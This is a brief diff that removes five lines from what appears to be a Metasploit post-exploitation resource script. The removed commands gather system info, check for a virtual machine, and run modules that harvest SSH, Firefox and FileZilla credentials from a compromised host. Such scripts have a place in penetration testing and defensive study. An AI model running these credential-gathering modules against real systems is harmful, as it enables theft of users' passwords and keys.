@@ -1,5 +1,0 @@
-sysinfo
-run post/windows/gather/checkvm
-run post/multi/gather/ssh_creds
-run post/multi/gather/firefox_creds
-run post/multi/gather/filezilla_client_cred
